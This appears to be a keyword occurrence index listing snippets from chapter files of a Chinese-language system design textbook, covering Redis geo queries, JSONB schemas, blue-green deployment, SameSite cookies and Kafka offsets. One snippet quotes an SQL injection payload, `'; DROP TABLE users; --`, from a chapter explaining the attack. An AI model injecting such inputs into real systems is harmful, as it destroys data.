  c25_b10.md: ...总操作）。总操作/秒：500,000 × 3 = 150 万（1.5M）。集群设计：3–4 个 Redis 节点，使用 consistent hashing（第 9 章）跨节点，每节点一个副本以保证可用性。每节点 375,000–500,000 操作/秒——在...
  c28_b11.md: ...nections load balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 | 低 **Consistent hashing (load balancer)** (Ch 9) | 无延迟开销；缓存亲和收益 | N/A | 高（变...
  c28_b12.md: ...更低（分布式写） | 分片内强；跨分片困难 | 高——分片故障影响 1/N 数据 | 高——跨分片查询、重分片痛苦 **Consistent hashing (DB)** (Ch 12, 26) | 无延迟成本；最小迁移 | N/A | 高——拓扑变更时最小扰...
  c28_b14.md: ...h 22) | 低（预计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈值管理、两条代码路径 **Consistent hashing + virtual nodes** (Ch 26) | 无延迟成本 | N/A | 极高（变更时最小扰...

=== driver (7 occurrences) ===
  c06_b10.md: ...案。  **数据库推荐：** 两层方案：  **第一层：Redis（键值存储）存当前位置：**       Key: "driver:{driver_id}:location"     Value: {lat: 37.7749, lon: -122.4...
  c06_b10.md: ...是结果数——对有界半径基本为常数时间。       GEOADD drivers 37.7749 -122.4194 "driver:123"     GEORADIUS drivers -122.4 37.77 5 km → ["driver:123...
  c06_b10.md: ...94 "driver:123"     GEORADIUS drivers -122.4 37.77 5 km → ["driver:123", "driver:456", ...]   **第二层：Cassandra（列族存储）存位置历史：**  分...
  c06_b10.md: ..."     GEORADIUS drivers -122.4 37.77 5 km → ["driver:123", "driver:456", ...]   **第二层：Cassandra（列族存储）存位置历史：**  分区键：`driver_id...
  c25_b03.md: ...设计它。   #### 写入路径  每 4 秒，每位活跃司机的移动应用发送一个 HTTP 请求：      POST /driver/{driver_id}/location     { "lat": 37.7749, "lng": -122.4194...
  c25_b03.md: ...（500,000）+ 操作；10 节点的分片 Redis 集群轻松处理 500 万操作/秒。司机当前位置存为简单键值：`driver:{id}:location → {lat, lng, geohash, timestamp}`。   #### Geo...
  c25_b05.md: ...的 ride request 与可用司机比率，按滚动 5 分钟窗口聚合 2. **触发：** 若 request-to-driver 比率超过阈值（如 2:1），对该单元格激活加价 3. **设置倍数：** 倍数与供需失衡成正比（2:1 时 1.5×，...

=== jsonb (7 occurrences) ===
  c06_b12.md: ...要强一致性（药物列表），哪些部分更自然呈文档形状（临床笔记）。答案可能是“使用关系型数据库，但为灵活部分使用 JSON/JSONB 列”——这是一种常见的混合模式。  **答案：**  **第 1 步：访问模式。** 读：医生打开一份患者记录，同时看...
  c06_b12.md: ...小——单节点 PostgreSQL 可轻松处理多年。  **推荐：关系型数据库（PostgreSQL），为临床笔记使用 JSONB 列。**       CREATE TABLE patients (         id...
  c06_b12.md: ...OW(),         body            TEXT,         metadata        JSONB  -- variable fields per note type     );   `clinical_notes`...
  c06_b12.md: ...variable fields per note type     );   `clinical_notes` 上的 `JSONB` 列处理可变元数据，无需单独文档存储。如果需要查询特定属性，PostgreSQL 可以为 JSONB 字段建索引。AC...
  c06_b12.md: ...tes` 上的 `JSONB` 列处理可变元数据，无需单独文档存储。如果需要查询特定属性，PostgreSQL 可以为 JSONB 字段建索引。ACID 事务确保药物条目及其对应临床笔记（如果一起写入）要么都提交，要么都不提交。  **为什么不用纯文...
  c06_b13.md: ...ngoDB 存笔记）会带来运维复杂度（双备份、两个连接池、系统间潜在一致性缺口）而无明显收益。PostgreSQL 的 JSONB 支持已覆盖灵活 schema 需求，无需单独系统。...
  c06_b14.md: ...合适——每份资料有可变的可选属性集合（简介、网站、商业类别、关联账户）。灵活 schema 无需迁移即可处理。或者，带 JSONB 列的关系型数据库（PostgreSQL 的混合方案）给你 schema 灵活性和关系查询能力。...

=== message (7 occurrences) ===
  c08_b07.md: ...ser must exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓     Return HTTP 200 "Account c...
  c09_b09.md: ...rpc UpdateBio (UpdateBioRequest) returns (User);     }      message GetUserRequest {       int64 user_id = 1;     }      messag...
  c09_b09.md: ...essage GetUserRequest {       int64 user_id = 1;     }      message User {       int64 id = 1;       string username = 2;...
  c15_b07.md: ...record to the database     COMMIT;     // Publish event to message queue: "payment.charge.succeeded"   数据库提交与事件发布之间存在空隙。如果服务在此...
  c15_b07.md: ...Saga 卡住——没有事件意味着下一步永远不运行。  另一种顺序：       // Publish event to message queue: "payment.charge.succeeded"     BEGIN;         INSERT...
  c21_b01.md: ...p 工程团队在 v7 面临这个挑战。SocialSnap 已增长到 5000 万用户，产品路线图要求增加 Direct Message（DM）功能。决策：构建简单收件箱模型（像带聊天 UI 的邮件）还是构建带送达回执、已读回执和在线状态的实时聊天系统。团...
  c28_b11.md: ...低（异步写 DB） | 最终——DB 可能落后缓存 | 缓存失败且未写 DB 有丢数据风险 | 高——需要失败恢复 **Message queue (point-to-point)** (Ch 8) | 生产者延迟更高（异步投递） | 至少一次或精确一次...

=== photo (7 occurrences) ===
  c10_b04.md: ...图片、视频、文档——任何字节） * 一个 **key**（唯一标识符——通常像路径：`users/42/profile-photo.jpg`） * **元数据**（content type、自定义属性、标签）  对象通过 HTTP API 访问：用...
  c10_b04.md: ...cket: socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Ob...
  c10_b04.md: ...ers/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Obje...
  c10_b04.md: ...ey: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Ob...
  c10_b04.md: ...key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看...
  c10_b04.md: ...key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结构。列出“用户 42 的所有对象”是前缀搜索...
  c11_b15.md: ...ned_url(user_id):         cache_key = f"presigned:{user_id}:photo"         cached = redis.get(cache_key)         if cached:...

=== thread (7 occurrences) ===
  c15_b16.md: ...集中在编排器服务。两种方法各有适用场景。  SocialSnap 开篇的“向用户收费并发送确认邮件”问题——本章开头的 Thread A 例子——现在完全可解：saga 配编排器、每次服务调用带幂等键、用 Outbox 模式可靠发布事件、用补偿事务（用...
  c20_b08.md: ...### 20.5 权衡矩阵  URL 短链设计产生如下权衡矩阵，完成 Thread B 的推进：  设计决策 | 延迟 | 一致性 | 可用性 | 运营复杂度 ---|---|---|---|--- R...
  c23_b03.md: ...，跳过重新索引。这与第 10 章 blob 存储讨论中的内容寻址存储思想相同。   #### 作为侦探的爬虫  本书的 Thread C——侦探纪律——一直关于从不完整证据中提取信号。爬虫的工作正是如此：从一小套种子 URL 开始，跟随证据（链接）发现...
  c26_b06.md: ...### 26.6 SocialSnap 完整技术栈——透过键值存储看  本节兑现 Thread A：SocialSnap 在规模化后，通过分布式键值存储的镜头揭示其完整基础设施。  SocialSnap v7 架构...
  c28_b16.md: ...### 28.9 侦探团队——良好沟通如何产生良好架构  Thread C——侦探纪律——一直是关于严谨地接近设计问题：收集证据、形成假设、针对约束测试、承诺最不错误的答案。我们已把它应用于...
  c28_b24.md: ...和规模参数是什么，哪种存储模型最适合这些参数，成本各是多少？”这种习惯——从需求和约束出发，而不是从偏好技术出发——是 Thread B（Tradeoff Matrix）作为一种思维方式的应用。它也是 Thread C（侦探纪律）作为一种认识论立场：先...
  c28_b24.md: ...约束出发，而不是从偏好技术出发——是 Thread B（Tradeoff Matrix）作为一种思维方式的应用。它也是 Thread C（侦探纪律）作为一种认识论立场：先收集证据再下结论。这种习惯比任何具体知识都更持久，因为技术会变（2030 年的数据...

=== blue (7 occurrences) ===
  c18_b05.md: ...部署风险。   #### 蓝绿部署  **蓝绿部署（blue-green deployment）** 维护两个生产环境：blue（当前服务流量）和 green（当前空闲，即将接收新部署）。部署流程：  1. 把新版本部署到 green 环境。运行健...
  c18_b05.md: ...把流量切到 green。这是瞬时的——一次配置变更。 3. 用第 17 章的完整可观测性监控 green。如果指标健康，blue 退役。如果指标差，把负载均衡器切回 blue——瞬时回滚。  蓝绿部署提供零停机部署和瞬时回滚。限制：同时运行两个完整...
  c18_b05.md: ...变更。 3. 用第 17 章的完整可观测性监控 green。如果指标健康，blue 退役。如果指标差，把负载均衡器切回 blue——瞬时回滚。  蓝绿部署提供零停机部署和瞬时回滚。限制：同时运行两个完整生产环境，部署窗口期间基础设施成本翻倍。  当...
  c18_b05.md: ...制：同时运行两个完整生产环境，部署窗口期间基础设施成本翻倍。  当部署包含数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不向后兼容，就不能同时从两个环境服务...
  c18_b08.md: ....5%”或“p99 延迟超过 SLO 阈值”） 2. **回滚动作：** 部署上一版本？翻转功能开关？把负载均衡器切回 blue？ 3. **回滚负责人：** 谁决定回滚？On-call 工程师？发布经理？ 4. **回滚验证：** 回滚后如何确认...
  c18_b10.md: ...ue），新版本部署到另一个（green），切换是瞬时的——零用户看到新版本，直到切换后所有用户同时看到。回滚瞬时：切回 blue。风险是二元的：要么所有用户在旧版本，要么所有用户在新版本。  金丝雀部署通过逐步把一小部分流量切到新版本来管理风险：1...
  c28_b13.md: ...re flags** (Ch 18) | 微小开销（开关检查） | N/A | 极高——即时启用/禁用 | 低–中 **Blue-green deployment** (Ch 18) | 无延迟开销 | N/A | 极高——即时切换 | 中——切换...

=== green (7 occurrences) ===
  c18_b05.md: ...布、只有在大规模才出现的边界情况。  三种部署策略管理生产部署风险。   #### 蓝绿部署  **蓝绿部署（blue-green deployment）** 维护两个生产环境：blue（当前服务流量）和 green（当前空闲，即将接收新部署）。部署...
  c18_b05.md: ...绿部署  **蓝绿部署（blue-green deployment）** 维护两个生产环境：blue（当前服务流量）和 green（当前空闲，即将接收新部署）。部署流程：  1. 把新版本部署到 green 环境。运行健康检查和冒烟测试。 2. 切换...
  c18_b05.md: ...护两个生产环境：blue（当前服务流量）和 green（当前空闲，即将接收新部署）。部署流程：  1. 把新版本部署到 green 环境。运行健康检查和冒烟测试。 2. 切换负载均衡器把流量切到 green。这是瞬时的——一次配置变更。 3. 用第...
  c18_b05.md: ...部署）。部署流程：  1. 把新版本部署到 green 环境。运行健康检查和冒烟测试。 2. 切换负载均衡器把流量切到 green。这是瞬时的——一次配置变更。 3. 用第 17 章的完整可观测性监控 green。如果指标健康，blue 退役。如果指...
  c18_b05.md: ...试。 2. 切换负载均衡器把流量切到 green。这是瞬时的——一次配置变更。 3. 用第 17 章的完整可观测性监控 green。如果指标健康，blue 退役。如果指标差，把负载均衡器切回 blue——瞬时回滚。  蓝绿部署提供零停机部署和瞬时回滚...
  c18_b05.md: ...窗口期间基础设施成本翻倍。  当部署包含数据库 schema 变更时也难以使用。如果 blue 用 schema v1，green 用 schema v2，且 schema 变更不向后兼容，就不能同时从两个环境服务流量。这就是为什么数据库迁移是大多数...
  c28_b13.md: ...ags** (Ch 18) | 微小开销（开关检查） | N/A | 极高——即时启用/禁用 | 低–中 **Blue-green deployment** (Ch 18) | 无延迟开销 | N/A | 极高——即时切换 | 中——切换期间双倍基础...

=== samesite (7 occurrences) ===
  c19_b07.md: ...com` 无法读取 SocialSnap 表单中的 CSRF token（被同源策略阻止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话 cookie 上设置 `SameSite=Strict` 或 `SameS...
  c19_b07.md: ...止），它无法伪造有效请求。  **SameSite cookie 属性** 是现代防御：在会话 cookie 上设置 `SameSite=Strict` 或 `SameSite=Lax`，告诉浏览器不在跨源请求上发送 cookie。这基本消除了现代浏览器的...
  c19_b07.md: ...eSite cookie 属性** 是现代防御：在会话 cookie 上设置 `SameSite=Strict` 或 `SameSite=Lax`，告诉浏览器不在跨源请求上发送 cookie。这基本消除了现代浏览器的 CSRF 风险。   #### 常见误...
  c19_b12.md: ...数据、修改支付记录、提升他们在其他系统的权限。最小权限限制爆炸半径。  **Q4.** 什么是 CSRF 攻击，为什么 SameSite cookie 属性能提供保护？...
  c19_b13.md: ...伪造请求看起来已认证。攻击者无法读取响应（被同源策略阻止），但如果请求有副作用（删除帖子、更改密码），损害已经发生。  SameSite cookie 属性指示浏览器不在跨源请求上发送 cookie。`SameSite=Strict` 时，会话 cooki...
  c19_b13.md: ...除帖子、更改密码），损害已经发生。  SameSite cookie 属性指示浏览器不在跨源请求上发送 cookie。`SameSite=Strict` 时，会话 cookie 只在请求来自同站时发送——`evil.com` 上的表单无法触发带会话 coo...
  c19_b13.md: ...il.com` 上的表单无法触发带会话 cookie 的 `socialsnap.com` 请求，因为浏览器会扣留它。`SameSite=Lax` 时，cookie 在顶层导航（点击链接）时发送，但不在子资源请求（图片、脚本、表单）上发送——在安全和可用性...

=== iac (7 occurrences) ===
  c28_b08.md: ...—服务器、负载均衡器、数据库、网络——从哪里来？  **基础设施即代码（Infrastructure as Code, IaC）** 是通过机器可读配置文件定义和管理基础设施的实践，对待这些配置像对待应用代码一样：版本控制、代码审查、测试、自动应...
  c28_b08.md: ...代码一样：版本控制、代码审查、测试、自动应用。  **Terraform**（来自 HashiCorp）是最广泛使用的 IaC 工具。Terraform 文件描述基础设施的期望状态：       resource "aws_db_instance...
  c28_b08.md: ...QL 数据库。修改 `instance_class` 并重新应用即可升级实例。配置文件是基础设施状态的权威描述。  **IaC 的好处：**  * **可复现性：** 任何基础设施都可以通过运行相同配置在新环境中完全重建（例如镜像生产的 stag...
  c28_b08.md: ...并留下版本历史。“谁改了数据库大小、何时改的？”由 `git log` 回答。 * **灾难恢复：** 若数据中心故障，IaC 允许在数小时（而非数天）内在不同区域重建整个基础设施。 * **漂移检测：** IaC 工具可以比较基础设施实际状态与...
  c28_b08.md: ...灾难恢复：** 若数据中心故障，IaC 允许在数小时（而非数天）内在不同区域重建整个基础设施。 * **漂移检测：** IaC 工具可以比较基础设施实际状态与声明配置，并在两者偏离时告警（工程师绕过 IaC 流水线手动修改了什么）。  Socia...
  c28_b08.md: ...整个基础设施。 * **漂移检测：** IaC 工具可以比较基础设施实际状态与声明配置，并在两者偏离时告警（工程师绕过 IaC 流水线手动修改了什么）。  SocialSnap 的完整基础设施——200 台应用服务器、40 个数据库实例、15 个...
  c28_b15.md: ...ucture as Code** (Ch 28) | N/A | 基础设施状态确定性 | 极高（可复现环境） | 中——IaC 工具学习曲线 **Serverless (FaaS)** (Ch 28) | 冷启动惩罚（100ms–2s） | 无状...

=== oregon (6 occurrences) ===
  c04_b09.md: ...个社交平台，必须跨两个数据中心同步复制写入到 3 个节点（为了持久性和灾备）。一个数据中心在 Virginia，一个在 Oregon。只有当 3 个副本都确认时，写入才算完成。估算最低写入延迟，并解释这如何约束你的架构。  提示  用第 3 章的延迟数...
  c04_b09.md: ...时，写入才算完成。估算最低写入延迟，并解释这如何约束你的架构。  提示  用第 3 章的延迟数字。Virginia 到 Oregon 的距离约 2500 英里。一个数据包跑这段距离要花多久？记住写入必须等待最慢的副本。  **答案：**  **网络延迟...
  c04_b09.md: ...里/秒（由于玻璃折射率，refractive index；光学中的 index，不是数据库索引）。Virginia 到 Oregon 距离：约 2500 英里。  单向传播时间：2500 / 124,000 ≈ 0.02 秒 = **20 ms 单向*...
  c04_b09.md: ...入延迟拆解：**  * 数据中心内本地网络：约 0.5 ms * 每个副本处理：约 2 ms * Virginia → Oregon → Virginia 往返：约 40 ms * 最低写入延迟总计：约 42 ms  采用同步复制时，每次写入都要等待最...
  c04_b09.md: ...nia 往返：约 40 ms * 最低写入延迟总计：约 42 ms  采用同步复制时，每次写入都要等待最慢的副本。如果 Oregon 副本需要 42 ms，每次写入至少 42 ms。  **架构约束：**...
  c04_b10.md: ...不可谈判），要么使用异步复制（接受 Oregon 可能略旧），要么只写本地副本（Virginia 的两个）再异步同步到 Oregon。这是直接的 CAP/PACELC tradeoff（权衡）：跨区域同步一致性让每次写入操作多花 42 ms。  这运用...

=== virginia (6 occurrences) ===
  c04_b09.md: ...章估算概念）你正在构建一个社交平台，必须跨两个数据中心同步复制写入到 3 个节点（为了持久性和灾备）。一个数据中心在 Virginia，一个在 Oregon。只有当 3 个副本都确认时，写入才算完成。估算最低写入延迟，并解释这如何约束你的架构。  提示...
  c04_b09.md: ...有当 3 个副本都确认时，写入才算完成。估算最低写入延迟，并解释这如何约束你的架构。  提示  用第 3 章的延迟数字。Virginia 到 Oregon 的距离约 2500 英里。一个数据包跑这段距离要花多久？记住写入必须等待最慢的副本。  **答案：*...
  c04_b09.md: ...约 124,000 英里/秒（由于玻璃折射率，refractive index；光学中的 index，不是数据库索引）。Virginia 到 Oregon 距离：约 2500 英里。  单向传播时间：2500 / 124,000 ≈ 0.02 秒 = **...
  c04_b09.md: ...洲这段。  **完整写入延迟拆解：**  * 数据中心内本地网络：约 0.5 ms * 每个副本处理：约 2 ms * Virginia → Oregon → Virginia 往返：约 40 ms * 最低写入延迟总计：约 42 ms  采用同步复制时，...
  c04_b09.md: ...* 数据中心内本地网络：约 0.5 ms * 每个副本处理：约 2 ms * Virginia → Oregon → Virginia 往返：约 40 ms * 最低写入延迟总计：约 42 ms  采用同步复制时，每次写入都要等待最慢的副本。如果 Ore...
  c05_b07.md: ...下线。我们需要复制——但复制引入一致性 tradeoff（第 4 章）。  **地理延迟：** 如果你的数据库服务器在 Virginia，用户在 Tokyo，每次数据库查询都要跨太平洋。本地 1ms 的数据库查询，跨洲链路上要花 150ms+。  这些限制...

=== email (6 occurrences) ===
  c05_b01.md: ...列代表一个属性。  SocialSnap 的初次尝试：  **users 表**  | id | username | email | password_hash | created_at | |---|---|---|---|---| | 1 |...
  c08_b04.md: ...topic         ↓     Message Broker         ├── delivers to Email Service (subscriber)         ├── delivers to Analytics Serv...
  c08_b07.md: ...↓     (Meanwhile, in the background...)     Queue Consumer: Email Service         ← reads "user.signup" event from queue...
  c08_b07.md: ...eads "user.signup" event from queue         ← sends welcome email (300ms — doesn't block the user)      Queue Consumer: Analy...
  c08_b11.md: ...['user_id']          # Check if we already sent the welcome email         already_sent = db.query(             "SELECT 1 FROM...
  c08_b11.md: ...# Idempotent: do nothing on duplicate          # Send the email         email_service.send_welcome_email(user_id)...

=== mentions (6 occurrences) ===
  c05_b10.md: ...osts 和 users 关联。  **答案：**  **Schema 扩展：**      CREATE TABLE mentions (         post_id     INTEGER REFERENCES posts(id) ON DELET...
  c05_b10.md: ...-- 快速找到提及某用户的所有帖子     CREATE INDEX idx_mentions_user_id ON mentions(user_id);     -- 快速找到某篇帖子提及的所有用户     -- 已由 PRIMARY KEY (pos...
  c05_b10.md: ...ntent, posts.created_at, author.username AS author     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN user...
  c05_b10.md: ...thor.username AS author     FROM mentions     JOIN posts ON mentions.post_id = posts.id     JOIN users AS author ON posts.user_i...
  c05_b10.md: ...JOIN users AS author ON posts.user_id = author.id     WHERE mentions.user_id = (SELECT id FROM users WHERE username = 'alice')...
  c05_b10.md: ...有了 `idx_mentions_user_id`，数据库先找到 Alice 的 `user_id`，再用索引只取 `mentions` 中 Alice 的行——O(log n + k)，k 是 Alice 被提及的次数。随后与 `posts` 和 `u...

=== urls (6 occurrences) ===
  c20_b04.md: ...简单设计开始，只在证据要求的地方增加复杂度。   #### 第 1 层：核心数据模型  两张表。从显然的开始：  **`urls` 表**（核心）：  * `short_code` (VARCHAR(16), PRIMARY KEY) — 短码或自...
  c20_b04.md: ...NT PRIMARY KEY) * `short_code` (VARCHAR(16), NOT NULL, FK → urls) * `clicked_at` (TIMESTAMP, NOT NULL) * `referrer` (TEXT, N...
  c20_b04.md: ...nt` (TEXT, NULLABLE) * `country_code` (CHAR(2), NULLABLE)  `urls` 表是事实来源。`clicks` 表是分析存储。立刻产生一个问题：它们应在同一个数据库吗？  116,000 次重定向...
  c20_b04.md: ...cks` 插入，`clicks` 表每秒收到 116,000 次写入。这对关系型数据库来说是非常高的写速率。相比之下，`urls` 表只有 1,157 次写入/秒——完全可管理。  把高写入分析与低写入核心数据放在一起会产生问题：分析写入消耗写 I...
  c20_b04.md: ...次写入/秒——完全可管理。  把高写入分析与低写入核心数据放在一起会产生问题：分析写入消耗写 I/O 预算，可能拖慢 `urls` 表的读延迟。把它们分开——`urls` 放在写优化的主数据库，`clicks` 放在高写入存储（时序数据库或 Kaf...
  c20_b04.md: ...析与低写入核心数据放在一起会产生问题：分析写入消耗写 I/O 预算，可能拖慢 `urls` 表的读延迟。把它们分开——`urls` 放在写优化的主数据库，`clicks` 放在高写入存储（时序数据库或 Kafka topic  feeding 数据...

=== tradeoffs (6 occurrences) ===
  c06_b02.md: ...文档存储允许直接嵌套相关数据——用户文档可以嵌入一组社交链接数组，避免单独的表和 JOIN。   #### 文档存储的 Tradeoffs  **收益：** schema 灵活性、层次数据的自然表达、通常单文档读取很快。  **代价（一致性）：** 大多数文...
  c06_b03.md: ...（Redis sorted set）、pub-sub 消息、实时在线状态（“谁现在在线”）。   #### 键值存储的 Tradeoffs（权衡）  **收益：** 微秒级读写。极致简单——无 schema、无迁移、无查询计划。可水平扩展（scalabili...
  c06_b04.md: ...也服务读）或一致性（要求多个节点同意）。这使其在全球应用中流行，区域故障不应导致完全不可用。   #### 列族存储的 Tradeoffs（权衡）  **收益：** 卓越的写入吞吐、分区内高效时间范围查询、可调一致性、优秀的水平可扩展性。  **代价（查询灵...
  c06_b05.md: ...。  **知识图谱：** 实体之间复杂关系网（搜索引擎用它驱动“相关问题”和相关概念建议）。   #### 图数据库的 Tradeoffs（权衡）  **收益：** 高效多跳遍历、关系型数据自然建模、表达力强的图查询语言（Neo4j 的 Cypher）。...
  c23_b04.md: ...buted systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed computing and consistency（一致性）" 4 | "desi...
  c23_b04.md: ...stems | [1, 2] design | [2, 4] hard | [1] consistency | [3] tradeoffs | [2] reliability | [4]  "distributed systems" 的查询变成：取 "dis...

=== systemdesign (6 occurrences) ===
  c06_b11.md: ...序集合中的 score：       ZINCRBY trending_hashtags:2024-01-15 1 "#systemdesign"     ZINCRBY trending_hashtags:2024-01-15 1 "#engineering"...
  c06_b11.md: ...VRANGE trending_hashtags:2024-01-15 0 9 WITHSCORES     → ["#systemdesign", "45231", "#engineering", "38204", ...]   对跨两天的 24 小时滚动窗口，...
  c10_b17.md: ...SQL 家族和第 5 章关系型数据库讨论）SocialSnap 分析团队想回答“过去 30 天有多少独立用户浏览了带 #systemdesign 标签的帖子，按国家细分？”源数据是浏览事件流：`{user_id, post_id, tags[], country,...
  c10_b18.md: ...Transaction Processing，联机事务处理）数据库。它的存储布局把一行所有列写在一起。对“统计标签为 #systemdesign 且国家为 US 且时间戳在 30 天内的独立用户数”这类分析查询，PostgreSQL 必须读取 view event...
  c10_b18.md: ...g 写入竞争。  **为什么对象存储（S3）不够：**  对象存储优化了按 key 读取或写入整个对象。“统计标签为 #systemdesign 的独立用户数”这类查询需要读取 bucket 中每个对象（或大范围前缀扫描）并在应用代码中过滤——没有查询引擎、没有索...
  c10_b18.md: ...igQuery 或 Athena）在查询时从 S3 读取 Parquet 文件，使用列式访问和谓词下推，在数秒内回答“#systemdesign 按国家浏览量”。 4. 频繁访问的聚合（每个标签的日活跃用户）预计算并存入更小的汇总表，供看板亚秒级查询。  这种架构...

=== table (6 occurrences) ===
  c06_b12.md: ...年。  **推荐：关系型数据库（PostgreSQL），为临床笔记使用 JSONB 列。**       CREATE TABLE patients (         id              SERIAL PRIMARY KEY,...
  c06_b12.md: ...LL,         insurance_id    VARCHAR(100)     );      CREATE TABLE medications (         id              SERIAL PRIMARY KEY,...
  c06_b12.md: ...DATE  -- NULL means still active     );      CREATE TABLE clinical_notes (         id              SERIAL PRIMARY KEY...
  c10_b06.md: ...：**  **方案 1：把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：...
  c19_b06.md: ...1'='1'` 永远为真，因此该查询返回数据库中所有用户。攻击者完全绕过了认证。  更具破坏性的输入：`'; DROP TABLE users; --` 使查询变成：       SELECT * FROM users WHERE username...
  c19_b06.md: ...使查询变成：       SELECT * FROM users WHERE username = ''; DROP TABLE users; --'   这删除了整个 users 表。所有用户数据丢失。  SQL 注入之所以有效，是因为应用通过字...

=== offset (6 occurrences) ===
  c08_b04.md: ...分区）**——一个跨多台服务器分区以实现可扩展性的只追加日志。生产者把消息追加到日志末尾。消费者从日志读取，维护自己的 offset。消息保留一段可配置时间（天或周），而不是消费后删除。...
  c08_b05.md: ...**多个消费者组独立推进：** 三个不同团队可以各有自己的消费者组读取同一个 Kafka 主题。每个消费者组维护自己的 offset。A 团队的分析管道可以落后 2 小时，而 B 团队的实时通知系统读取相同消息但有自己的日志位置，不受影响。  **可重...
  c08_b05.md: ...B 团队的实时通知系统读取相同消息但有自己的日志位置，不受影响。  **可重放：** 因为消息被保留，消费者可以重置 offset 重放历史事件。当你部署一个以新方式处理相同事件的新消费者（如新的推荐算法）时，可以让它从日志开头处理所有历史事件。在传...
  c08_b05.md: ...万条消息。   #### Kafka 的代价  Kafka 运维复杂。搭建 Kafka 集群、调整分区数、管理消费者组 offset、维护协调服务（历史上是 ZooKeeper，现在是 KRaft）都需要专业知识。日志保留模型意味着必须仔细配置保留期—...
  c08_b16.md: ...30 天的用户活动到新算法来验证推荐，再部署到生产。  用 Kafka（消息保留 30 天）：团队创建新消费者组，将 offset 设为 30 天前，读取所有 30 天活动事件。新算法在受控测试环境中处理它们。其他消费者不受影响——生产推荐服务有自己...
  c08_b16.md: ...为 30 天前，读取所有 30 天活动事件。新算法在受控测试环境中处理它们。其他消费者不受影响——生产推荐服务有自己的 offset，读取日志实时末端。回放需要数小时（批处理模式），团队在不触碰生产的情况下验证新模型。  用传统队列（消费即删除）：那...

=== data (6 occurrences) ===
  c09_b08.md: ...er     PUT  /users/42                   → replace user 42's data     PATCH /users/42                  → partial update of us...
  c11_b04.md: ...return session_id      def get_session(session_id):         data = redis.get(f"session:{session_id}")         if data is Non...
  c11_b04.md: ...data = redis.get(f"session:{session_id}")         if data is None:             return None  # Session expired or inva...
  c14_b13.md: ...赞时，美国数据中心把 `us-east` 从 1203 本地递增到 1204。  任何用户看到的点赞总数是所有 per-data-center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data...
  c14_b13.md: ...data-center 计数器之和：本例中 1203 + 847 + 412 = 2462。每个数据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map...
  c14_b13.md: ...据中心从本地 per-data-center map 副本计算该总和。  收敛期间：数据中心定期互相复制它们的 per-data-center map。合并操作很简单——对每个数据中心计数器取最大值。如果 EU 节点有 `{"us-east": 1...

=== seen (6 occurrences) ===
  c23_b02.md: ...edia，我们的爬虫会再次把 Wikipedia 加入队列并爬第二次——然后无限循环。队列变成无限。  解决方案是 **seen set** —— 所有已访问 URL 的集合。入队前检查 URL 是否在 seen set 中。如果是，跳过。...
  c23_b02.md: ...。队列变成无限。  解决方案是 **seen set** —— 所有已访问 URL 的集合。入队前检查 URL 是否在 seen set 中。如果是，跳过。      if url not in seen_set:         queue.en...
  c23_b02.md: ...ueue(url)         seen_set.add(url)  100 亿（10 billion）URL 时，seen set 是 100 亿 URL 字符串。精确存入内存不可行（每个 URL 约 100 字节；100 亿 × 100 字...
  c23_b02.md: ...是 100 亿 URL 字符串。精确存入内存不可行（每个 URL 约 100 字节；100 亿 × 100 字节 = seen set 单独 1 TB 内存）。实用方案是 **Bloom filter** —— 一种概率数据结构，以极高确定性回答...
  c23_b09.md: ...有文档快得多，因为即使对常见词，posting list 也只是所有文档的极小一部分。  **Q4.** 为什么爬虫的 seen-set 需要 Bloom filter 而不是标准 hash set？  **答案：** 标准 hash set 把每...
  c23_b09.md: ...hash set 把每个 URL 存为完整字符串。100 亿（10 billion）URL 平均 100 字节，精确 seen-set 约需 1 TB 内存——昂贵，可能超过单机可用 RAM。Bloom filter 用多个哈希函数每个条目只存几...

=== object (6 occurrences) ===
  c10_b04.md: ...orage Service）。概念模型：       Bucket: socialsnap-media         Object key: users/42/profile-photo.jpg         Object key: users/4...
  c10_b04.md: ...edia         Object key: users/42/profile-photo.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/100...
  c10_b04.md: ...to.jpg         Object key: users/42/cover-photo.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/...
  c10_b04.md: ...hoto.jpg         Object key: posts/1001/photo-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/...
  c10_b04.md: ...to-1.jpg         Object key: posts/1001/photo-2.jpg         Object key: posts/1001/photo-3.jpg   这些 key 看起来像路径，但只是字符串——没有真实目录结...
  c28_b11.md: ...ck storage (SSD/HDD)** (Ch 10) | SSD 低，HDD 中 | 持久 | 中 | 低 **Object storage (S3)** (Ch 10) | 中（网络往返） | 最终（可选强一致） | 极高（11 个 9（11...

=== aws (6 occurrences) ===
  c11_b07.md: ...。 * 对任何瓶颈（CPU、内存、磁盘 I/O）都立即有效。  **局限：**  * 存在物理上限。截至 2024 年，AWS 最大实例有 448 个 vCPU 和 24 TB RAM。你无法给单台机器加第 2,000 个 CPU。 * 成本非线...
  c18_b04.md: ...Monkey 的故事  Netflix 用名为 Chaos Monkey 的工具推广了混沌工程。Netflix 运行在 AWS 上，他们观察到 EC2 实例有时会意外失败。与其构建旨在防止实例失败的架构（不可能完全实现），不如构建能容忍实例失败的...
  c28_b04.md: ...、负载均衡和维护。开发者只为代码实际执行时间付费，而不为空闲服务器时间付费。  plain 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 provider 在需要的基础设施上运行...
